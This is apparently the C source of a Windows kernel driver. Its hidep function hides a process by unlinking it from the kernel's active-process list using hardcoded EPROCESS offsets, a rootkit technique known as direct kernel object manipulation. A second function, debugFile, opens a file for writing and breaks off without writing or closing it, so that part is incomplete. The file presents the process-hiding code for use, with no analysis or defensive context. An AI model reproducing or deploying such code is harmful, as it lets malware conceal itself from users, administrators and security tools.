#include "Driver.h"

PCHAR hidep(UINT32 pid) {

	/*
	
	* EPROCESS

	0x00 Pcb :							_KPROCESS
	0x438 ProcessLock:					_EX_PUSH_LOCK
	0x440 UniqueProcessId:				LPVOID
	0x448 ActiveProcessLinks:			_LIST_ENTRY
	0x458 RundownProtect:				_EX_RUNDOWN_REF
	0x460 Flags2:						0xd000
	0x460 JobNotReallyActive:			0y0
	0x460 AccountingFolded:				0y0
	0x460 NewProcessReported:			0y0
	0x460 ExitProcessReported:			0y0
	0x460 ReportCommitChanges:			0y0
	0x460 LastReportMemory:				0y0
	0x460 ForceWakeCharge:				0y0
	0x460 CrossSessionCreate:			0y0
	0x460 NeedsHandleRundown:			0y0
	0x460 RefTraceEnabled:				0y0
	0x460 PicoCreated:					0y0
	0x460 EmptyJobEvaluated:			0y0
	0x460 DefaultPagePriority:			0y101
	0x460 PrimaryTokenFrozen:			0y1
	0x460 ProcessVerifierTarget:		0y0
	0x460 RestrictSetThreadContext:		0y0
	0x460 AffinityPermanent:			0y0
	0x460 AffinityUpdateEnabled:		0y0
	0x460 PropagateNode:				0y0
	0x460 ExplicitAffinity:				0y0
	0x460 ProcessExecutionState:		0y00
	
	*/




	PEPROCESS currentProcess = PsGetCurrentProcess();
	ULONG CurrentPID = *((ULONG*)((ULONG_PTR)currentProcess + 0x440)); // (ULONG)((ULONG_PTR)PsGetProcessId(currentProcess));
	CurrentPID = (ULONG)((ULONG_PTR)PsGetProcessId(currentProcess));

	const ULONG LIST_OFFSET = 0x448;	// Offset in PEPROCESS for the linked list

	PLIST_ENTRY currentList = (LIST_ENTRY*)((ULONG_PTR)currentProcess + LIST_OFFSET);

	if (CurrentPID == pid) {

		PLIST_ENTRY prev = currentList->Blink;
		PLIST_ENTRY next = currentList->Flink;

		prev->Flink = next;
		next->Blink = prev;

		// Re-write the current LIST_ENTRY to point to itself (avoiding BSOD)
		currentList->Blink = currentList;
		currentList->Flink = currentList;
	}

	return NULL;
}

void debugFile(WCHAR name[]) {

	// START
	NTSTATUS ntstatus = STATUS_SUCCESS;
	/////////////////////// THIS SECTION /////////////////////////////////////
	UNICODE_STRING     uniName;
	OBJECT_ATTRIBUTES  objAttr;
	////////////////////////////////\\SystemRoot\\ or C:\WINDOWS / C:|WINNT
	RtlInitUnicodeString(&uniName, name);  // or L"\\SystemRoot\\example.txt"
	InitializeObjectAttributes(&objAttr, &uniName,
		OBJ_CASE_INSENSITIVE,
		NULL, NULL);
	//////////////////////////////////

	///////////////////////////////////
	// Load the buffer (ie. contents of text file to the console)
	HANDLE handle;
	IO_STATUS_BLOCK    ioStatusBlock;
	ntstatus = ZwCreateFile(&handle,
		FILE_WRITE_DATA,
		&objAttr, &ioStatusBlock,
		NULL,
		FILE_ATTRIBUTE_NORMAL,
		0,
		FILE_OPEN_IF,
		FILE_NON_DIRECTORY_FILE,
		NULL, 0);

}